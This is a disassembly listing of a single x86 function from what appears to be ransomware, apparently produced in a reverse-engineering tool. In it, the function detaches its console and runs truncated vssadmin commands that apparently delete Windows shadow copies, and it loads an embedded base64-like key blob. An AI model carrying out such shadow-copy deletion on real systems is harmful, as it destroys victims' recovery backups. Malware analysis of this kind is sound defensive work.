.text:002DF650 sub_2DF650 proc near                    ; CODE XREF: sub_2DC5A0:loc_2DC69E↑p
.text:002DF650                                         ; StartAddress+3E↓p
.text:002DF650
.text:002DF650 var_A8= dword ptr -0A8h
.text:002DF650 var_A4= dword ptr -0A4h
.text:002DF650 var_A0= dword ptr -0A0h
.text:002DF650 var_9C= byte ptr -9Ch
.text:002DF650 Src= dword ptr -4Ch
.text:002DF650 var_3C= dword ptr -3Ch
.text:002DF650 var_38= dword ptr -38h
.text:002DF650 Block= dword ptr -34h
.text:002DF650 var_30= byte ptr -30h
.text:002DF650 var_24= dword ptr -24h
.text:002DF650 var_20= dword ptr -20h
.text:002DF650 pIdentifierAuthority= _SID_IDENTIFIER_AUTHORITY ptr -1Ch
.text:002DF650 var_14= dword ptr -14h
.text:002DF650 var_10= dword ptr -10h
.text:002DF650 var_C= dword ptr -0Ch
.text:002DF650 var_4= dword ptr -4
.text:002DF650 arg_4= dword ptr  0Ch
.text:002DF650
.text:002DF650 ; FUNCTION CHUNK AT .text:00332530 SIZE 00000061 BYTES
.text:002DF650 ; FUNCTION CHUNK AT .text:00332596 SIZE 0000002A BYTES
.text:002DF650
.text:002DF650 push    ebp
.text:002DF651 mov     ebp, esp
.text:002DF653 push    0FFFFFFFFh
.text:002DF655 push    offset SEH_40F650
.text:002DF65A mov     eax, large fs:0
.text:002DF660 push    eax
.text:002DF661 sub     esp, 9Ch
.text:002DF667 mov     eax, ___security_cookie
.text:002DF66C xor     eax, ebp
.text:002DF66E mov     [ebp+var_14], eax
.text:002DF671 push    ebx
.text:002DF672 push    esi
.text:002DF673 push    edi
.text:002DF674 push    eax
.text:002DF675 lea     eax, [ebp+var_C]
.text:002DF678 mov     large fs:0, eax
.text:002DF67E mov     [ebp+var_10], esp
.text:002DF681 mov     dword ptr [ebp+pIdentifierAuthority.Value], 0
.text:002DF688 mov     word ptr [ebp+pIdentifierAuthority.Value+4], 100h
.text:002DF68E push    offset pSid                     ; pSid
.text:002DF693 push    0                               ; nSubAuthority7
.text:002DF695 push    0                               ; nSubAuthority6
.text:002DF697 push    0                               ; nSubAuthority5
.text:002DF699 push    0                               ; nSubAuthority4
.text:002DF69B push    0                               ; nSubAuthority3
.text:002DF69D push    0                               ; nSubAuthority2
.text:002DF69F push    0                               ; nSubAuthority1
.text:002DF6A1 push    0                               ; nSubAuthority0
.text:002DF6A3 push    1                               ; nSubAuthorityCount
.text:002DF6A5 lea     eax, [ebp+pIdentifierAuthority]
.text:002DF6A8 push    eax                             ; pIdentifierAuthority
.text:002DF6A9 call    ds:AllocateAndInitializeSid
.text:002DF6AF call    ds:GetCurrentProcessId
.text:002DF6B5 mov     dword_359278, eax
.text:002DF6BA call    ds:FreeConsole
.text:002DF6C0 push    offset aCWindowsSysnat_0        ; "C:\\Windows\\SysNative\\vssadmin.exe de"...
.text:002DF6C5 call    sub_30DC04
.text:002DF6CA push    offset aCWindowsSystem_0        ; "C:\\Windows\\System32\\vssadmin.exe del"...
.text:002DF6CF call    sub_30DC04
.text:002DF6D4 mov     [ebp+Block], 0
.text:002DF6DB mov     [ebp+var_24], 0
.text:002DF6E2 mov     [ebp+var_20], 0
.text:002DF6E9 mov     [ebp+var_24], 0
.text:002DF6F0 mov     [ebp+var_20], 0Fh
.text:002DF6F7 mov     byte ptr [ebp+Block], 0
.text:002DF6FB mov     [ebp+var_24], 4
.text:002DF702 mov     [ebp+Block], 42415141h
.text:002DF709 mov     [ebp+var_30], 0
.text:002DF70D mov     [ebp+var_4], 0
.text:002DF714 push    0                               ; void *
.text:002DF716 lea     eax, [ebp+Block]
.text:002DF719 push    eax                             ; Src
.text:002DF71A lea     eax, [ebp+Src]
.text:002DF71D push    eax                             ; void *
.text:002DF71E call    sub_2F1320
.text:002DF723 add     esp, 14h
.text:002DF726 mov     esi, eax
.text:002DF728 mov     byte ptr [ebp+var_4], 1
.text:002DF72C cmp     esi, offset xmmword_35721C
.text:002DF732 jz      short loc_2DF766
.text:002DF734 mov     ecx, offset xmmword_35721C
.text:002DF739 call    sub_2E2BC0
.text:002DF73E movups  xmm0, xmmword ptr [esi]
.text:002DF741 movups  xmmword_35721C, xmm0
.text:002DF748 movq    xmm0, qword ptr [esi+10h]
.text:002DF74D movq    qword_35722C, xmm0
.text:002DF755 mov     dword ptr [esi+10h], 0
.text:002DF75C mov     dword ptr [esi+14h], 0Fh
.text:002DF763 mov     byte ptr [esi], 0
.text:002DF766
.text:002DF766 loc_2DF766:                             ; CODE XREF: sub_2DF650+E2↑j
.text:002DF766 mov     byte ptr [ebp+var_4], 0
.text:002DF76A lea     ecx, [ebp+Src]
.text:002DF76D call    sub_2E2BC0
.text:002DF772 mov     [ebp+var_4], 0FFFFFFFFh
.text:002DF779 mov     ecx, [ebp+var_20]
.text:002DF77C cmp     ecx, 10h
.text:002DF77F jb      short loc_2DF7AD
.text:002DF781 inc     ecx
.text:002DF782 mov     edx, [ebp+Block]
.text:002DF785 mov     eax, edx
.text:002DF787 cmp     ecx, 1000h
.text:002DF78D jb      short loc_2DF7A3
.text:002DF78F add     ecx, 23h ; '#'
.text:002DF792 mov     edx, [eax-4]
.text:002DF795 sub     eax, edx
.text:002DF797 add     eax, 0FFFFFFFCh
.text:002DF79A cmp     eax, 1Fh
.text:002DF79D ja      loc_2DFADF
.text:002DF7A3
.text:002DF7A3 loc_2DF7A3:                             ; CODE XREF: sub_2DF650+13D↑j
.text:002DF7A3 push    ecx
.text:002DF7A4 push    edx                             ; Block
.text:002DF7A5 call    sub_30851F
.text:002DF7AA add     esp, 8
.text:002DF7AD
.text:002DF7AD loc_2DF7AD:                             ; CODE XREF: sub_2DF650+12F↑j
.text:002DF7AD mov     [ebp+var_24], 0
.text:002DF7B4 mov     [ebp+var_20], 0Fh
.text:002DF7BB mov     byte ptr [ebp+Block], 0
.text:002DF7BF mov     [ebp+Src], 0
.text:002DF7C6 mov     [ebp+var_3C], 0
.text:002DF7CD mov     [ebp+var_38], 0
.text:002DF7D4 mov     [ebp+var_3C], 0
.text:002DF7DB mov     [ebp+var_38], 0Fh
.text:002DF7E2 mov     byte ptr [ebp+Src], 0
.text:002DF7E6 push    2B0h
.text:002DF7EB lea     ecx, [ebp+Src]
.text:002DF7EE call    sub_2E3350
.text:002DF7F3 mov     [ebp+var_3C], 2ACh
.text:002DF7FA mov     [ebp+var_38], 2AFh
.text:002DF801 mov     ecx, 0ABh
.text:002DF806 mov     esi, offset aUagkcg5mzsQxxu     ; "uaGKCG5Mzs/qXXuWAooBP4GHL60GR/Kld5rpSDw"...
.text:002DF80B mov     edi, eax
.text:002DF80D rep movsd
.text:002DF80F mov     byte ptr [eax+2ACh], 0
.text:002DF816 mov     [ebp+Src], eax
.text:002DF819 mov     [ebp+var_4], 2
.text:002DF820 push    0                               ; void *
.text:002DF822 lea     eax, [ebp+Src]
.text:002DF825 push    eax                             ; Src
.text:002DF826 lea     eax, [ebp+Block]
.text:002DF829 push    eax                             ; void *
.text:002DF82A call    sub_2F1320
.text:002DF82F add     esp, 0Ch
.text:002DF832 mov     esi, eax
.text:002DF834 mov     byte ptr [ebp+var_4], 3
.text:002DF838 cmp     esi, offset xmmword_357204
.text:002DF83E jz      short loc_2DF872
.text:002DF840 mov     ecx, offset xmmword_357204
.text:002DF845 call    sub_2E2BC0
.text:002DF84A movups  xmm0, xmmword ptr [esi]
.text:002DF84D movups  xmmword_357204, xmm0
.text:002DF854 movq    xmm0, qword ptr [esi+10h]
.text:002DF859 movq    qword_357214, xmm0
.text:002DF861 mov     dword ptr [esi+10h], 0
.text:002DF868 mov     dword ptr [esi+14h], 0Fh
.text:002DF86F mov     byte ptr [esi], 0
.text:002DF872
.text:002DF872 loc_2DF872:                             ; CODE XREF: sub_2DF650+1EE↑j
.text:002DF872 mov     byte ptr [ebp+var_4], 2
.text:002DF876 lea     ecx, [ebp+Block]
.text:002DF879 call    sub_2E2BC0
.text:002DF87E mov     [ebp+var_4], 0FFFFFFFFh
.text:002DF885 mov     ecx, [ebp+var_38]
.text:002DF888 cmp     ecx, 10h
.text:002DF88B jb      short loc_2DF8B9
.text:002DF88D inc     ecx
.text:002DF88E mov     edx, [ebp+Src]
.text:002DF891 mov     eax, edx
.text:002DF893 cmp     ecx, 1000h
.text:002DF899 jb      short loc_2DF8AF
.text:002DF89B add     ecx, 23h ; '#'
.text:002DF89E mov     edx, [eax-4]
.text:002DF8A1 sub     eax, edx
.text:002DF8A3 add     eax, 0FFFFFFFCh
.text:002DF8A6 cmp     eax, 1Fh
.text:002DF8A9 ja      loc_2DFAE4
.text:002DF8AF
.text:002DF8AF loc_2DF8AF:                             ; CODE XREF: sub_2DF650+249↑j
.text:002DF8AF push    ecx
.text:002DF8B0 push    edx                             ; Block
.text:002DF8B1 call    sub_30851F
.text:002DF8B6 add     esp, 8
.text:002DF8B9
.text:002DF8B9 loc_2DF8B9:                             ; CODE XREF: sub_2DF650+23B↑j
.text:002DF8B9 mov     [ebp+var_3C], 0
.text:002DF8C0 mov     [ebp+var_38], 0Fh
.text:002DF8C7 mov     byte ptr [ebp+Src], 0
.text:002DF8CB push    offset unk_35925C
.text:002DF8D0 call    sub_2F01C0
.text:002DF8D5 mov     eax, offset xmmword_35721C
.text:002DF8DA cmp     dword ptr qword_35722C+4, 10h
.text:002DF8E1 cmovnb  eax, dword ptr xmmword_35721C
.text:002DF8E8 push    eax
.text:002DF8E9 push    0                               ; int
.text:002DF8EB push    0                               ; int
.text:002DF8ED push    1                               ; int
.text:002DF8EF push    1                               ; lpData
.text:002DF8F1 push    dword ptr qword_35722C
.text:002DF8F7 push    offset unk_35925C
.text:002DF8FC call    sub_2F00A0
.text:002DF901 push    offset unk_359250
.text:002DF906 call    sub_2F01C0
.text:002DF90B mov     eax, offset xmmword_357204
.text:002DF910 cmp     dword ptr qword_357214+4, 10h
.text:002DF917 cmovnb  eax, dword ptr xmmword_357204
.text:002DF91E push    eax
.text:002DF91F push    0
.text:002DF921 push    0
.text:002DF923 push    1
.text:002DF925 push    1
.text:002DF927 push    dword ptr qword_357214
.text:002DF92D push    offset unk_359250
.text:002DF932 call    sub_2F00A0
.text:002DF937 add     esp, 40h
.text:002DF93A mov     [ebp+var_4], 4
.text:002DF941 lea     ecx, [ebp+var_9C]
.text:002DF947 call    sub_2D71D0
.text:002DF94C mov     byte ptr [ebp+var_4], 5
.text:002DF950 lea     eax, [ebp+Block]
.text:002DF953 push    eax
.text:002DF954 call    sub_2DF1B0
.text:002DF959 add     esp, 4
.text:002DF95C mov     byte ptr [ebp+var_4], 6
.text:002DF960 push    eax
.text:002DF961 mov     ecx, offset unk_3571EC
.text:002DF966 call    sub_2DA3D0
.text:002DF96B mov     byte ptr [ebp+var_4], 5
.text:002DF96F lea     ecx, [ebp+Block]
.text:002DF972 call    sub_2E2BC0
.text:002DF977 push    offset unk_3571EC
.text:002DF97C lea     eax, [ebp+Block]
.text:002DF97F push    eax                             ; int
.text:002DF980 lea     ecx, [ebp+var_9C]
.text:002DF986 call    sub_2E7840
.text:002DF98B mov     byte ptr [ebp+var_4], 7
.text:002DF98F push    eax
.text:002DF990 mov     ecx, offset unk_357264
.text:002DF995 call    sub_2DA440
.text:002DF99A mov     byte ptr [ebp+var_4], 5
.text:002DF99E lea     ecx, [ebp+Block]
.text:002DF9A1 call    sub_2E2C40
.text:002DF9A6 lea     eax, [ebp+Block]
.text:002DF9A9 push    eax                             ; void *
.text:002DF9AA call    sub_2DFCB0
.text:002DF9AF add     esp, 4
.text:002DF9B2 mov     byte ptr [ebp+var_4], 8
.text:002DF9B6 push    eax                             ; int
.text:002DF9B7 mov     ecx, offset unk_357294
.text:002DF9BC call    sub_2DA440
.text:002DF9C1 mov     byte ptr [ebp+var_4], 5
.text:002DF9C5 lea     ecx, [ebp+Block]
.text:002DF9C8 call    sub_2E2C40
.text:002DF9CD sub     esp, 18h
.text:002DF9D0 mov     ecx, esp
.text:002DF9D2 mov     [ebp+var_A0], esp
.text:002DF9D8 push    offset unk_357294               ; Src
.text:002DF9DD call    sub_2D6BD0
.text:002DF9E2 mov     byte ptr [ebp+var_4], 9
.text:002DF9E6 mov     byte ptr [ebp+var_4], 5
.text:002DF9EA call    sub_2E0280
.text:002DF9EF lea     eax, [ebp+Block]
.text:002DF9F2 push    eax                             ; void *
.text:002DF9F3 call    sub_2DFB60
.text:002DF9F8 add     esp, 1Ch
.text:002DF9FB mov     byte ptr [ebp+var_4], 0Ah
.text:002DF9FF push    eax                             ; int
.text:002DFA00 mov     ecx, offset unk_3572AC
.text:002DFA05 call    sub_2DA440
.text:002DFA0A mov     byte ptr [ebp+var_4], 5
.text:002DFA0E lea     ecx, [ebp+Block]
.text:002DFA11 call    sub_2E2C40
.text:002DFA16 sub     esp, 18h
.text:002DFA19 mov     ecx, esp
.text:002DFA1B mov     [ebp+var_A0], esp
.text:002DFA21 push    offset unk_3572AC               ; Src
.text:002DFA26 call    sub_2D6BD0
.text:002DFA2B mov     byte ptr [ebp+var_4], 0Bh
.text:002DFA2F mov     byte ptr [ebp+var_4], 5
.text:002DFA33 call    sub_2E0150
.text:002DFA38 add     esp, 18h
.text:002DFA3B mov     byte ptr [ebp+var_4], 4
.text:002DFA3F lea     ecx, [ebp+var_9C]
.text:002DFA45 call    sub_2D9AF0
.text:002DFA4A
.text:002DFA4A loc_2DFA4A:                             ; CODE XREF: sub_2DF650+45C↓j
.text:002DFA4A                                         ; DATA XREF: sub_2DF650+457↓o
.text:002DFA4A mov     [ebp+var_4], 0FFFFFFFFh
.text:002DFA51 mov     [ebp+var_4], 0Dh
.text:002DFA58
.text:002DFA58 loc_2DFA58:                             ; CODE XREF: sub_2DF650+48E↓j
.text:002DFA58                                         ; DATA XREF: sub_2DF650+489↓o
.text:002DFA58 mov     [ebp+var_4], 0FFFFFFFFh
.text:002DFA5F mov     ecx, [ebp+var_C]
.text:002DFA62 mov     large fs:0, ecx
.text:002DFA69 pop     ecx
.text:002DFA6A pop     edi
.text:002DFA6B pop     esi
.text:002DFA6C pop     ebx
.text:002DFA6D mov     ecx, [ebp+var_14]
.text:002DFA70 xor     ecx, ebp                        ; StackCookie
.text:002DFA72 call    @__security_check_cookie@4      ; __security_check_cookie(x)
.text:002DFA77 mov     esp, ebp
.text:002DFA79 pop     ebp
.text:002DFA7A retn
.text:002DFA7B ; ---------------------------------------------------------------------------
.text:002DFA7B
.text:002DFA7B loc_2DFA7B:                             ; DATA XREF: .rdata:stru_351E94↓o
.text:002DFA7B mov     ecx, [ebp+var_A4]
.text:002DFA81 mov     eax, [ecx]
.text:002DFA83 mov     eax, [eax+4]
.text:002DFA86 call    eax
.text:002DFA88 mov     esi, eax
.text:002DFA8A push    offset aErrrrrrrror             ; "ERRRRRRRROr"
.text:002DFA8F push    offset unk_359670
.text:002DFA94 call    sub_2D26D0
.text:002DFA99 push    esi
.text:002DFA9A push    offset unk_359670
.text:002DFA9F call    sub_2D26D0
.text:002DFAA4 add     esp, 10h
.text:002DFAA7 mov     eax, offset loc_2DFA4A
.text:002DFAAC retn
.text:002DFAAD ; ---------------------------------------------------------------------------
.text:002DFAAD
.text:002DFAAD loc_2DFAAD:                             ; DATA XREF: .rdata:stru_351E84↓o
.text:002DFAAD mov     ecx, [ebp+var_A8]
.text:002DFAB3 mov     eax, [ecx]
.text:002DFAB5 mov     eax, [eax+4]
.text:002DFAB8 call    eax
.text:002DFABA mov     esi, eax
.text:002DFABC push    offset aErrrrrrrror             ; "ERRRRRRRROr"
.text:002DFAC1 push    offset unk_359670
.text:002DFAC6 call    sub_2D26D0
.text:002DFACB push    esi
.text:002DFACC push    offset unk_359670
.text:002DFAD1 call    sub_2D26D0
.text:002DFAD6 add     esp, 10h
.text:002DFAD9 mov     eax, offset loc_2DFA58
.text:002DFADE retn
.text:002DFADF ; ---------------------------------------------------------------------------
.text:002DFADF
.text:002DFADF loc_2DFADF:                             ; CODE XREF: sub_2DF650+14D↑j
.text:002DFADF call    __invalid_parameter_noinfo_noreturn
.text:002DFAE4 ; ---------------------------------------------------------------------------
.text:002DFAE4
.text:002DFAE4 loc_2DFAE4:                             ; CODE XREF: sub_2DF650+259↑j
.text:002DFAE4 call    __invalid_parameter_noinfo_noreturn
.text:002DFAE4 sub_2DF650 endp ; sp-analysis failed
.text:002DFAE4